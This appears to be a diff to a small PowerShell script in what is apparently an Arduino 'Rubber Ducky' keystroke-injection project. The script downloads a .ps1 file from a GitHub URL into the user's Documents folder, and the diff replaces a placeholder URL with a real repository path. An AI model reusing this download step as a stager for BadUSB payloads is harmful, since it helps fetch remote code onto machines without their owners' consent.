@@ -1,8 +1,8 @@
 $documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
 
-$githubUrl = "https://raw.githubusercontent.com/<tuo-username>/<nome-repo>/main/altroFile.ps1"
+$githubUrl = "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/PROVA.ps1"
 
-$destinationFile = "$documentsPath\altroFile.ps1"
+$destinationFile = "$documentsPath\PROVA.ps1"
 
 Invoke-WebRequest -Uri $githubUrl -OutFile $destinationFile
 
